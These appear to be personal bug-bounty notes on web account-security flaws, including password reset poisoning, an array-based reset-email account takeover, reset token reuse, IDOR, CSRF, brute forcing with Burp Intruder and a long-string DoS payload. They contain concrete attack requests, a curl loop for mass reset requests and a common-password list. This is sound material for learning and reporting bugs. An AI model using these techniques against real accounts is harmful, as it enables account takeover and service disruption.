
## Password Reset Poisoning

#reset_poisoning

## Intercept the password reset request


And then we simply add a **"2" in the host header** so we can see if gets redirected as a valid domain:

![[Pasted image 20250323214839.png]]

2 password reset link has been sent, one legit and one with our specially crafted url:

![[Pasted image 20250323214040.png]]


## Exploit

You can exploit this with **Burp Collaborator** once you modify the link and send it to the victim, The victim clicks it and you should be able to get **the token**

![[Pasted image 20250323215224.png]]

Once you got the token, open up **your valid password reset link** and ~={blue}replace your token =~token (which in this case, is in the url) ~={orange}with the one you have intercepted:=~

![[Pasted image 20250323215415.png]]

If everything goes right, it will ask you to change your password:

![[Pasted image 20250323215511.png]]

Verify the exploit:

Login with the **username captured** and **use the new password**:


![[Pasted image 20250323215608.png]]


----

# Account Takeover via Password Reset without user interactions which accepts a section of Arrays



### **insecure handling of email input** within the password reset functionality

report by: https://hackerone.com/reports/2293343

_I found a way to change the password of a GitLab account via the password reset form and successfully retrieve the final reset link without user interactions, using just its email address._

Go to "Forgot Your Password?" link Enter the victim's email and intercept the submit request via Burp Suite . 

**Then right-click on the HTTP Editor inside Burp Suite and select Extensions** 

-> Content-Type Converter -> Convert to JSON 

(make sure to have the Content-Type Converter plugin installed from the BApp Store) 

Now replace this converted JSON line `"user[email]":"victim@gmail.com"`, to

```http
 "user" {
     "email" [
              "victim@gmail.com",
              "attacker@gmail.com"
       ]
 },
```

**Forward the requests and you should get an email containing the reset link that was send to both emails** (`victim@gmail.com` and `attacker@gmail.com`) . 

Click on the reset link, **change the password and done**, you can now login as the victim using the new password.

## Impact:

_By just <mark style="background: #FF5582A6;">knowing the victim email address used on GitLab</mark>, you can takeover his account by changing his password without user interaction since the attacker get the same email as the victim.


## But Why this Happens?

![[Pasted image 20250625143006.png]]

Since `msg["To"]` in the `EmailMessage` object accepts a list, the email ends up being sent to _all_ the addresses you pass in that list—even if that wasn’t the original intent.

**The bug happens because the system doesn't check if the email is a single valid address. So when you sneak in multiple addresses (like an array)**, it **sends the reset email to all of them**—including the attacker.

> [!NOTE] Main Reason
> Why? The code expects something like: `"email": "victim@gmail.com"` But it accepts: `"email": ["victim@gmail.com", "attacker@gmail.com"]` ...and blindly sends the link to both.

_**Fix?** Only accept one email as a plain string, and block anything else like arrays or weird formats.


---
#### No Password Policy

Go to the in scope target, create an account and see if you have any password policy enabled. [Here are some common password lists](https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords). Below are top 100 common passwords-



```
password 123456 123456789 guest qwerty 12345678 111111 12345 col123456 123123 1234567 1234 1234567890 000000 555555 666666 123321 654321 7777777 123 D1lakiss 777777 110110jp 1111 987654321 121212 Gizli abc123 112233 azerty 159753 1q2w3e4r 54321 pass@123 222222 qwertyuiop qwerty123 qazwsx vip asdasd 123qwe 123654 iloveyou a1b2c3 999999 Groupd2013 1q2w3e usr Liman1000 1111111 333333 123123123 9136668099 11111111 1qaz2wsx password1 mar20lt 987654321 gfhjkm 159357 abcd1234 131313 789456 luzit2000 aaaaaa zxcvbnm asdfghjkl 1234qwer 88888888 dragon 987654 888888 qwe123 football 3601 asdfgh master samsung 12345678910 killer 1237895 1234561 12344321 daniel 000000 444444 101010 qazwsxedc 789456123 super123 qwer1234 123456789a 823477aA 147258369 unknown 98765 q1w2e3r4 232323 102030 12341234
```


Try to use some of the passwords from above and see if you are able to create an account. If you are, you got a bug!

![None](https://miro.medium.com/v2/resize:fit:700/1*MhDVPlu2S7ygsk8iRBEaTA.png)

No password policy

#### Failure to invalidate the session

Perform the following steps:

1. Log in to the application
2. Again log in to the same account from different browser.
3. Attempt to change the password. The application will send a password reset link to your email.
4. Open the link and reset the password.
5. Go to the other browser and reload the page. If you are successfully able to reload the page and still logged in, you have a bug!

![None](https://miro.medium.com/v2/resize:fit:700/1*MEeLqZswhKAx_mropA-nZA.png)

Failure to invalidate session.


#### Password Reset Link sent over HTTP

This is something very small that you can check when you are clicking the reset password link; you can check if the link is an HTTP or HTTPS link. If you find the reset link in HTTP, you got a bug!

![None](https://miro.medium.com/v2/resize:fit:700/1*7nnWp8VoMncYyXBOpec9Ow.png)

Weak Password Reset.


**Criteria:** when we open that link in browser it must ask for new password directly.

There is one more feature **on which we can test it on when we invite user then the invitation link that is sent over email must be on https it that link is on http then it’s bug.**

Now let’s see how to create report for this bug…

**Description:-** When the password reset implementation is not implemented properly , the strength of the overall authentication process for the application is diminished. Tokens sent over HTTP, predictable reset tokens, and long expiry times create weak conditions for the password reset implementation.

**Steps to reproduce:-**

1. Go to forgot password page
2. Enter the registered email
3. Go to the email inbox
4. Right-click on the box and copy the link
5. Paste the link in the browser
6. Check if the link is on HTTP

#### While deleting account

Remember you should always check all the functionalities of an account including deleting the account. Here's something you should check-

1. Log in to the application.
2. Go to profile and try to delete the account.
3. The application should ask you for your account password to delete the account.

**Impact:** This vulnerability could lead to data theft from the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users.


If not, you got a bug!

![None](https://miro.medium.com/v2/resize:fit:700/1*VjoT5LkeliaUwKTp7aHMyg.png)

					No password confirmation

---


###  Weak Registration Implementation

**==Description:-==** The user registration process in the application is vulnerable due to weak implementation, which could allow an attacker to exploit the system by bypassing security mechanisms or manipulating user account creation. This can lead to unauthorized access, account takeover, or user data leakage.

**==Steps to reproduce:-==**

1. Open this url in browser — example.com/signup
2. An account verification link will be sent
3. Go to email inbox and open the email
4. Right-click on the link and copy the link
5. Paste the link in notepad/browser and check if it is on HTTP
6. Press enter and check if the account is opened or not.

**==Impact:==** Weak Registration Implementation could lead to data theft through the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users, including performing other malicious attacks, which would appear to originate from a legitimate user.


### Weak Password Reset Implementation

When we click on forgot password in website then it will send a link on our email id and if the link is on http then it is consider as bug, but there is a criteria for that..

**==Criteria:==** when we open that link in browser it must ask for new password directly.

There is one more feature on which we can test it on when we invite user then the invitation link that is sent over email must be on https it that link is on http then it’s bug.

Now let’s see how to create report for this bug…

**==Description:-==** When the password reset implementation is not implemented properly , the strength of the overall authentication process for the application is diminished. Tokens sent over HTTP, predictable reset tokens, and long expiry times create weak conditions for the password reset implementation.

**==Steps to reproduce:-==**

1. Go to forgot password page
2. Enter the registered email
3. Go to the email inbox
4. Right-click on the box and copy the link
5. Paste the link in the browser
6. Check if the link is on HTTP

**==Impact:==** This vulnerability could lead to data theft from the attacker’s ability to manipulate data through their access to the application, and their ability to interact with other users.

### Broken authentication – Failure to invalidate session on logout

~={yellow}Might be as **Informative** or even a P5=~

This is also another simple vulnerability in which website fails to validate user’s session even after they logout.

To find this vulnerability first login to your account in two different tabs of same browser. Then logout from one tab and if your account is automatically logout from the second tab of same browser then it’s not a bug but if the session still persist in another tab even after you logout from the first tab then try to change some data in the account and if you successfully updated some data in your account then it a bug.

**==Criteria:==** Bugcrowd didn’t consider this vulnerability as P4.

Let’s create POC :

==**Description:-**== The application fails to invalidate a user’s session on logout, leaving the account vulnerable to session hijacking. An attacker may compromise a user’s session then be able to change the password of the account and lock out the legitimate user.

**==Steps to reproduce:-==**

1. Go to the URL – example.com
2. Open the same account on two different tabs on the same browser – Browser A
3. Click on the Logout from one tab – TAB A
4. Once the session is terminated, go to the second tab (TAB B) and update some data and save it
5. Post changing the data, click on the refresh button.
6. The data will be updated.

==**Impact:-**== This vulnerability can lead to reputational damage and indirect financial loss to the company as customers may view the application as insecure as the session is still running after logout.


## No Rate-Limiting on report for other user Comment:

**==Description:-==** The “report comment” functionality on the platform allows users to report comments that may be offensive or inappropriate. However, there is no rate limiting on the report request, which enables an attacker to automate the reporting process and reach the threshold number of reports required for comment removal.  
  
**==Steps to reproduce:-==**

1. Visit page https://example.com/blog/page4/report-comment?comment_id=33
2. Report this comment and capture request in Burpsuite
3. Send this request in burpsuite intruder and start attack
4. After few minutes the user comment got deleted

**==Impact:-==** The absence of rate limiting on the “report comment” feature allows attackers to automate reporting and remove legitimate comments without genuine user input. This can lead to unauthorized censorship, negatively affect user experience, and erode trust in the platform’s moderation capabilities.


## Exif Geo Location:

==**Description:-**== When a user uploads an image in example.com, the uploaded image’s EXIF Geolocation Data does not get stripped. As a result, anyone can get sensitive information of example.com users like their Geolocation, their Device information like Device Name, Version, Software & Software version used, etc.

**==Steps to reproduce:-==**

1. Visit example.com  
2. Go to the Upload option on the website  
3. Upload the image with EXIF metadata.  
4. Right click on the image and download it.  
5. Visit [https://jimpl.com](https://jimpl.com)  
6. Upload the downloaded image and check for sensitive data.

==**Impact:-**== This vulnerability is CRITICAL and impacts all the example.com customer base. This vulnerability violates the privacy of a User and shares sensitive information of the user who uploads an image on example.com or any of the example.com instances.

### Email Verification Bypass

Email verification bypass can perform in many ways let’s see some of these cases.

==**Case 1 and 2:-**== **Unprotected Account Activation URLs**

Some websites use predictable URLs for email verification, like `example.com/verify?user_id=1234`. If these URLs do not include a sufficiently unique token or other secure identifier and simply rely on a user ID, an attacker could attempt to access `example.com/verify?user_id=1234` directly, and by this you are able to varify any account without email verification link.   **-- the second is just predictable tokens.**

==**Case 3:-**== **Bypassing Verification Status Checks**

In some cases, you can directly access sections of the site meant for verified users if the site doesn’t enforce verification checks on restricted actions. For example, if the site fails to check a user’s verification status at each sensitive action, attackers could simply skip the verification step and proceed to use the account. There is also another way for this if the site is using “is_varified: false” then you can try bypassing that also just by “is_varified: true”

**==Case 4:-==** **Direct Access to the Verified User Area**

Sometimes when you signup to a website and it won’t allow you to access any features or anything and asking for email verification then you can try some of predictable URL paths (e.g., `/dashboard` or `/profile`) that you can directly access by typing the URL in the browser. This might gives you the access of website without verification.

**==Case 5:-==** **Verification email hijacking**

Sometimes, when you change your email address on a website, it will send a new verification link to confirm the change. **However, if you don’t verify it right away and then change your email again to a different address you want to hijack, the previous verification link might still work.** By clicking the first link, you might be able to verify the new email address without needing access to it. This allows you to hijack the target email on the account if the system hasn’t invalidated the old verification link.

**==Impact:-==** The impact of bypassing email verification includes unauthorized account access, risk of impersonation, **potential account takeover, and undermined trust in the platform’s security measures.**

---

```bash
waymore -i bugcrowd.com -mode U -oU waymore_bugcrowd.com
```

![None](https://miro.medium.com/v2/resize:fit:700/1*xtC6IDdTtBkQs4RwcX5N_w.png)

- Some programs are the same, and they are visible in the programs list section of bugcrowd.
- Some are not live yet.
- Some are invalid.
- The remaining are the ones that help us to find the program name, Google Dork it, and then legitimately submit via the embedded submission form.

```bash
cat waymore_bugcrowd.com | grep -i "external/report$"
cat waymore_bugcrowd.com | grep -i "external/report$" | sort -u 
```

![None](https://miro.medium.com/v2/resize:fit:700/1*AywIBt28MiaXWyhO5nXbeQ.png)

> If you find the form like this, then it's of no use

![None](https://miro.medium.com/v2/resize:fit:700/1*NtL9VPEkmTAmdA8Fwr1FMw.png)

But with a form like this below where the company or target name is visible, now we can directly go to the website and check the footer and other tab sections for vulnerability or responsible disclosure policy, ~={yellow}you will observe the Bugcrowd Embedded submission form there and then we can safely check the scope of the program and submit bugs.=~

![None](https://miro.medium.com/v2/resize:fit:700/1*J6QtKvShsmPeMa_AYZX3iA.png)

Using this technique, I found one lesser-known program and reported one P4 bug

----

# Rate limit attack using Burp suite.

**make sure proxy is configured with your web browser in order to fetch request in Burp Suite

step-1 configure the proxy in your browser. Turn on the burp suite and click on option of “Proxy” and turn the intercept on.

![](https://miro.medium.com/v2/resize:fit:627/1*jhazIsF6zh5L0RoJrUX5hw.png)

step 2- Turn on the promising target website/domain.

**i have taken [login page (vulnweb.com)](http://testphp.vulnweb.com/login.php) as an testing website.

![](https://miro.medium.com/v2/resize:fit:627/1*j7A8ciQTrI1X-Wk5u4QMEw.png)

step 3- add the credentials.

![](https://miro.medium.com/v2/resize:fit:627/1*AVuUnxQJ3Qz1469O4agFfw.png)

step 4- go back to Burp suite and details about request made will be displayed.

![](https://miro.medium.com/v2/resize:fit:627/1*hiFaR-kPjku6BDGanu-Gcw.png)

step 5- right click and select option “sent to intruder” in order to make changes in request.

![](https://miro.medium.com/v2/resize:fit:627/1*RdblH9bVQqOSDip2aEufhQ.png)

step 6- select username and password and click on the “ADD$” on the right side of the screen.

![](https://miro.medium.com/v2/resize:fit:627/1*BmfO9usd7Bx7jbUK9fyfWA.png)

step 7- selecting attack type from given above index box.

**attack type may vary upon the choice of user

![](https://miro.medium.com/v2/resize:fit:627/1*QlzIcVau-W3wrrV7FdHfyw.png)

step 8- setting payload for username repeating the same for password.

(Payload 1= username, Payload 2=password)

clicking on the “start attack.”

![](https://miro.medium.com/v2/resize:fit:627/1*JZLt1lWhkFOC5iBavd30Jw.png)

Result displayed shows toe combination of username and password brute forced on website/domain, along with status code.

---

The bug name  was “**_Password Reset Link Not Expired After Use_**”. This comes under the VRT of “**_Insufficient Security Configurability >Weak Reset Password Implementation > Token Not Invalidated After Use_**”

**Steps To Find This Bug:**

1. Go to [https://target.com](https://target.com/)/ password reset page.
2. Enter your email, and ask for a password reset link.
3. Now go to mail and open that link in two tabs.
4. Reset the password from one tab, reload the other tab , and if it let’s you reset password again then it is vulnerable to token not invalidated after use as we are resetting the password two times with same token.

**Impact/Exploit Scenario**: If victim’s email account is still logged into his/her Office Computers or any public Internet Café. Then any external attacker can use the used token to reset victims password.

**Severity:** Now due to this difficult to happen exploit scenario , which requires user interaction it is given as a **P4** bug under Bugcrowd VRT.

![[Pasted image 20241201123349.png]]

---

Intruder is a powerful tool for carrying out automated customised attacks against web applications. It is highly configurable and can be used to perform a wide range of tasks to make your testing faster and more effective.

This feature of Burp Intruder makes it possible for us to test for rate limiting with ease. There are three methods with the help of intruder to test for rate limiting:

1. **Via email parameter:**

1)Click on email sending feature(for eg: forgot password)

2)Enter email and intercept that request.

3)Send to intruder and select ‘your email’ parameter as an injection point!

4)Paste your email in the payload list 100 times.

5)Start an attack and you will be receiving 100 emails.

1. **Via q parameter**
3)Send to the intruder and select the ‘q’ parameter as an injection point!

4)Set payload type number and for testing purpose set number of payload 100

5)Start an attack and you will be receiving 100 emails.

1. **Via null parameter**

1)Click on email sending feature(for eg: forgot password)

2)Enter email and intercept that request.

3)sent to intruder and select blank space as an injection point!

4)set payload type NULL Payload and for testing purpose set number of payload 100

5)Start an attack and you will be receiving 100 emails.


----

**5: My Account**

In many websites with login feature has a my account option where you can find bugs —

- Check for CSRF
- Tamper user ID and check if you can change other user's account information
- Check Account Deletion Functionality
- Check for CSRF Token Bypass

**6: Forgot Password:**

- Check for username enumeration
- Reset token key expiration time
- Weak password policy testing
- Predict reset token
- All sessions should be destroyed when user changes the password

**Bugname : Dos with longstrings.**

> **What is the dos(denial of service).**

**Denial of Service (DoS) refers to a type of cyber-attack aimed at making a machine or network resource unavailable to its intended users. This is typically achieved by overwhelming the target with an excessive amount of traffic or requests, thereby disrupting legitimate access to services.**

**SO LETS SEE HOW I FINDED THIS BUG.**

**In my account creation page i entered required details.**

![None](https://miro.medium.com/v2/resize:fit:700/1*FhRJIO3xBhL3AOhVFCHfbA.png)

**Before clicking on Start free trail . i opened my burpsuite.**

**FoxyProxy turned on .**

![None](https://miro.medium.com/v2/resize:fit:700/1*TleXyKhoR0Fn2M-bfS-n6w.png)

**In burp i turned interception on.**

![None](https://miro.medium.com/v2/resize:fit:700/1*AcnwNW8DHKS0oK5Z-E7lmQ.png)

**After i clicked on Start free trail.**

**In burp suite i successfully intercepted that request and sened into repeter.**

![None](https://miro.medium.com/v2/resize:fit:700/1*yJBY57UIghxgotVjknXfvg.png)

**In repeter i changed my first name with a long random string with morethen 5000 characters.**

**You can see the responce before putting my payload.**

![None](https://miro.medium.com/v2/resize:fit:700/1*jaZ0VnzYzy-TkUPLlFotEA.png)

**I entered my payload in first_name feild .**

![None](https://miro.medium.com/v2/resize:fit:700/1*CWTt54VuByqETZT-ccjMOQ.png)

**After i clicked on send .**

![None](https://miro.medium.com/v2/resize:fit:700/1*4cZKq9rFlGmHWgCDSHCtcg.png)

**After loading fewseconds it retured with 500 internal server error.**

![None](https://miro.medium.com/v2/resize:fit:700/1*Wl9VifYBengI8DXnke_U7Q.png)

**Response in browser.**

![None](https://miro.medium.com/v2/resize:fit:700/1*tUdo91pEH-ugwVjZHIbUsw.png)

**payload used in this attack.**

`loyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytodayloyalonlytoday`

**Impact:**

**DoS attack can render a website or service unavailable to legitimate users, leading to immediate revenue loss.Extended downtime or service issues can damage a company's reputation, leading to lost customer trust and loyalty.** **The aftermath of a DoS attack can be expensive, involving costs related to system repairs, legal fees, and potential fines.Identify and block traffic from known malicious IP addresses or ranges. This proactive measure helps prevent harmful traffic from reaching your systems.While DoS attacks primarily aim to disrupt service, they can sometimes be used as a smokescreen for other malicious activities, such as data exfiltration.**

---

### 1. Content Spoofing

**Description:** Content Spoofing allows attackers to manipulate how content appears on a webpage, misleading users by displaying fake messages or misleading information under the guise of a trusted domain. This vulnerability is often exploited in **social engineering attacks**, where users are tricked into taking unintended actions, such as entering credentials or clicking malicious links.

**Example Scenario:** Imagine you encounter a login error URL like this:


**Example Scenario:** Imagine you encounter a login error URL like this:

```bash
https://example.com/login.php?error=access-denied
```

Now, if you modify the URL parameter `error` to something like:

```perl
https://example.com/login.php?error=you%20are%20hacked
```

…and the modified message appears on the webpage, you've just discovered a **Content Spoofing vulnerability**!

### Real-World Example of Content Spoofing

A large e-commerce website once allowed attackers to spoof order confirmation messages by manipulating URL parameters. For example:

```bash
https://shop.com/order-confirmation.php?orderID=123&status=delivered
```

Attackers replaced `status=delivered` with `status=cancelled`, leading to customer confusion and reputational harm for the company.

----


[🔐 Bug Bounty Tip: Finding Password Reset Vulnerabilities | by Professor Software Solutions | Nov, 2024 | Medium](https://bughuntar.medium.com/bug-bounty-tip-finding-password-reset-vulnerabilities-f51fdf2b47b0)


<iframe width="928" height="522" src="https://www.youtube.com/embed/EI52YTRfGRU" title="$360 bug bounty | account takeover through reset password | hackerone bug bounty poc | most easy one" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

to test this bug, in the json data, simply add in the list the gmail of the victim account:

![[Pasted image 20241210232444.png]]


![[Pasted image 20241210232325.png]]

-> forward -> intercept off


![[Pasted image 20241210232458.png]]

Then if you open your mail box, you should have the same password reset token for both the attacker and victim user, having a full ATO.

----

# All About Password Reset Vulnerabilities

source: https://medium.com/@ahmed.elshaepe/all-about-password-reset-vulnerabilities-061e8e24c5bd


## 1. Host Header Injection

**Example:**

- **Scenario:** The application sends a password reset link based on the Host header
- **Exploit:** Intercept the request and modify

> Host: attacker.com

- **Outcome:** The reset link is generated with `http://attacker.com/reset?token=xyz`, allowing the attacker to intercept the link.

# 2. IDOR in Password Reset

**Example:**

- **Scenario:** The request contains a user ID.
- **Exploit:** Intercept the request:

```
POST /reset-password   
{  
 "user_id": "12345"  
 }
```
- Change `"user_id": "12345"` to `"user_id": "67890"`.
- **Outcome:** The password reset for user `67890` is triggered, not the attacker’s account.

# 3. Email Parameter Manipulation

**Example:**

- **Scenario:** The reset request accepts the email field.
- **Exploit:** Intercept the request:

```
POST /reset-password  
{  
 "email": "victim@example.com"   
}
```

- Change `victim@example.com` to `attacker@example.com`.
- **Outcome:** The reset link is sent to `attacker@example.com`.

# 4. Password Reset Token Reuse

**Example:**

### Example Scenario

1. **Requesting a Reset Token**: An attacker requests a password reset token for their own account (`attacker@example.com`).
    
2. **Using the Token**: The attacker uses the received token (`abc123`) to reset the password for the victim's account (`victim@example.com`).
    

### Exploit

- **Scenario:** A token issued for one account is valid for another.
- **Exploit:** Request a reset token for `attacker@example.com`. Use the same token:

```
POST /reset-password   
{   
"token": "abc123",  
 "new_password": "newpassword"   
}
```

- **Outcome:** Token `abc123` resets `victim@example.com`’s password.

# 5. Weak Password Reset Token Generation

**Example:**

- **Scenario:** Tokens are predictable.
- **Exploit:** Notice tokens are sequential: `token123`, `token124`. Guess the next token:

/reset-password?token=token125

- **Outcome:** Reset another user’s password using a guessed token.

# 6. Password Reset Link Redirect

**Example:**

- **Scenario:** The reset link includes a redirection parameter.
- **Exploit:**

GET /reset-password?token=xyz&redirect=http://attacker.com

- **Outcome:** User is redirected to `http://attacker.com` after resetting their password.

# 7. Cross-Site Request Forgery (CSRF) in Password Reset

**Example:**

- **Scenario:** No CSRF protection.
- **Exploit:** Attacker crafts a form:

```
<form action="http://target.com/reset-password" method="POST">   
<input type="hidden" name="email" value="victim@example.com">  
 </form>
```

<form action="http://target.com/reset-password" method="POST">   
<input type="hidden" name="email" value="victim@example.com">  
 </form>

- **Outcome:** User unknowingly triggers a reset for `victim@example.com`.

# 8. Response Manipulation

**Example:**

- **Scenario:** The reset process leaks sensitive info in the response.
- **Exploit:** Modify intercepted response:
```json

HTTP/1.1 200 OK   
{   
"user": "victim@example.com",  
 "reset_link": "http://example.com/reset?token=xyz"  
}

Inject:

{  
"user": "attacker@example.com",  
 "reset_link": "http://attacker.com/reset?token=xyz"  
}
```

- **Outcome:** Attacker gains the reset link.

# 9. Missing Rate Limiting

**Example:**

- **Scenario:** No rate limit on password reset.
- **Exploit:** Use a script to automate:
```python

for i in {1..1000}; do   
curl -X POST http://example.com/reset-password -d "email=user$i@example.com"   
done

```
- **Outcome:** Brute-force tokens or enumerate valid users.

# 10. Session Fixation During Password Reset

**Example:**

**Scenario:** Session ID remains unchanged post-reset.

**Exploit:**

- Attacker logs in as a victim.
- Initiates a password reset.
- After reset, still has the session:

POST /reset-password   
Cookie: session=abc123

- **Outcome:** Attacker retains access even after the victim resets the password.

----

## Username limitation parameter Bypass:

source: https://medium.com/@mrcix/bypass-of-username-policy-breaking-the-rules-with-a-simple-trick-fcf7ce97925c
# Story:

Late one evening, I decided to dive into some bug hunting for a quick session. I noticed the application had strict username rules during registration—special characters like `@@` or `...` or numeric-only usernames like `123` were not allowed. Also, I can't change my username after signing up. It seemed solid.

![](https://miro.medium.com/v2/resize:fit:875/0*QFnqqSv0ZHxcb_qB)

# Process:

I registered normally and went to my profile settings. However, the option to change my username was disabled.

![](https://miro.medium.com/v2/resize:fit:875/0*T-Xu4WG7w1GF0ZPl)

I didn’t stop there. I decided to change my bio and intercepted the request using Burp Suite.

![](https://miro.medium.com/v2/resize:fit:875/0*1tylcUUAzaKVE6Oy)

While reviewing the request, I spotted that I could add a parameter that doesn’t exist that allowed me to modify my username.

![](https://miro.medium.com/v2/resize:fit:875/0*HZTa008Jc1vc-O4u)

After I added the parameter, I sent the request again, and it just worked!!

![](https://miro.medium.com/v2/resize:fit:875/0*MVyp8qMaGh7nGjEV)

My profile was updated successfully.

![](https://miro.medium.com/v2/resize:fit:875/0*uCEQXLh1JwALDNRB)


---

#  $200 DLL Hijacking Attack

## Bug Hunting + Malware Development

-  To learn from basics, refer these blogs:


[4 Methods to hijack DLLs](https://www.crowdstrike.com/en-us/blog/4-ways-adversaries-hijack-dlls/)
![[Pasted image 20250118221137.png]]

[DLL Hijacking techniques](https://unit42.paloaltonetworks.com/dll-hijacking-techniques/)

![[Pasted image 20250118222358.png]]

[Windows Exploit DLL Hijack](https://www.upguard.com/blog/dll-hijacking)

![[Pasted image 20250118221449.png]]

Threat analysis report:

[DLL Side-Loading](https://www.cybereason.com/blog/threat-analysis-report-dll-side-loading-widely-abused)

![[Pasted image 20250118221926.png]]

_To learn how malware developers use it, analyse open source malwares available publicly. (the source code, not the final binary)_

## 📕Vulnerability Name

- DLL Hijacking vulnerability via missing dll (profapi.dll)

🐞Affected Product:

- Windows app latest

## 🚨Severity

- Low/P5/Informative/Not a bug (varies from company to company)
## Phase1 Steps:

1. Download process monitor tool from the website at:

https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

2. Open Process Monitor tool and apply the following 3 filters

(we need to exclude path that contains Windows folder as it keeps extra permission)  
Path => contains => Windows => then exclude (click add)

(include only paths that contains .dll)  
